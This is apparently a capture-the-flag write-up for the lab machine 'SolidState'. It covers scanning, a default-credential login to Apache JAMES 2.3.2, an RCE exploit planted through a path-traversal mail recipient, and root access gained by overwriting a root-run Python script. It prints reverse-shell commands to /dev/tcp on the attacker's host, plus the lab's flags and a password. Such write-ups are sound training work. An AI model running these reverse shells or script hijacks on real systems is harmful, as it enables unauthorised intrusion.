# CTF Writeup: SolidState

## Lab Description

SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required. 

---

## Reconaissance

An initial scan to enumerate services running on the target, revealed the following information:

```
nmap -n -Pn -sS -p- 10.129.54.123         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 08:00 EDT
Nmap scan report for 10.129.54.123
Host is up (0.023s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds
```

An more in-depth scan revealed the following information:

```
nmap -n -Pn -sCV -p 22,25,80,110,119,4555 10.129.54.123 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 08:10 EDT
Nmap scan report for 10.129.54.123
Host is up (0.016s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 363.83 seconds
```

Mapped domain solidstate.htb to target ip address in our local dns file /etc/hosts

```
sudo echo "10.129.54.123 solidstate.htb" | sudo tee -a /etc/hosts
```

Analyzing the website, we find an potential user called "webadmin" at the bottom of the page.

```
webadmin@solid-state-security.com
```

We weren't able to find any hidden directories or sub-domains unfortunately.

Let's try to check the service running on 4555.
Connected to it with netcat.

```
nc solidstate.htb 4555
```

Was able to retrieve version and service running "JAMES Remote Administration Tool 2.3.2" and logged in
successfully with default credentials root:root

```
nc solidstate.htb 4555                                 
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

## Vulnerability Assessment

There is an vulnerability on the application which allows us to get Remote Command Execution

Downloaded the exploit, configured an reverse connection to my local machine ip inside the payload and ran it

```
python2 exploit.py solidstate.htb
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

Unfortunately it didn't work as intended, even when accessing and logging into pop3 with an user acc, it's not working.


## Initial Access


I decided to enumerate the users we gained further in the service running at 4555

Changed mindy's password and logged into her user acc in pop3.

```
y
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
Connection closed by foreign host.
```

The 2nd mail provided us with ssh login credentials.


```
ssh mindy@solidstate.htb               
The authenticity of host 'solidstate.htb (10.129.54.123)' can't be established.
ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'solidstate.htb' (ED25519) to the list of known hosts.
mindy@solidstate.htb's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: @team.pl>
Message-ID: <5416255.0.1761142491675.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.186 ([10.10.14.186])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 98
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 22 Oct 2025 10:14:01 -0400 (EDT)
Date: Wed, 22 Oct 2025 10:14:01 -0400 (EDT)
From: team@team.pl

: No such file or directory
-rbash: $'\r': command not found
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: @team.pl>
Message-ID: <30321308.1.1761142642764.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.186 ([10.10.14.186])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 570
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 22 Oct 2025 10:16:32 -0400 (EDT)
Date: Wed, 22 Oct 2025 10:16:32 -0400 (EDT)
From: team@team.pl

: No such file or directory
-rbash: $'\r': command not found
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: @team.pl>
Message-ID: <1056872.2.1761143122959.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.14.186 ([10.10.14.186])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 354
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 22 Oct 2025 10:24:32 -0400 (EDT)
Date: Wed, 22 Oct 2025 10:24:32 -0400 (EDT)
From: team@team.pl

: No such file or directory
/bin/bash: connect: Connection refused
/bin/bash: /dev/tcp/10.10.14.186/1337: Connection refused
-rbash: $'\r': command not found
mindy@solidstate:~$
```

Retrieved user.txt in /home/mindy directory.

```
57534de3fda09cbf6ba2348048aa536b
```

## Privilege Escalation


Well since our listener on port 1337 was up and running, logging in with ssh actually triggered our payload and we have an stable shell as user mindy now, the ssh one, didn't allow us to navigate through the system!


We found an interesting script which is ran by root rights in the /opt directory called "tmp.py", we are also able to edit it. It removes all files within the /tmp directory. So I am assuming it is being ran in an algorithm every couple of mins, similiar to a cronjob.
The issue is that the editors are in raw mode, so whenever we want to navigate down to the parameter we want to change it actually removes characters of the source code, instead of navigating down. We will have to overwrite the whole content of script, in order to add our reverse shell payload inside the os.system "parameter".


```
# Overwrite the entire file
printf '#!/usr/bin/env python\nimport os\nimport sys\ntry:\n     os.system(\"bash -c \\\"bash -i >& /dev/tcp/10.10.14.186/8888 0>&1\\\"\")\nexcept:\n     sys.exit()' > tmp.py
```

Started up listener on port 8888


```
nc -lvnp 8888
```

Gained RCE as root


```
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.53.183] 56806
bash: cannot set terminal process group (2550): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~#
```

Retrieved root.txt in /root directory.

```
36466f791a7968052659691ac1cf47ef
```
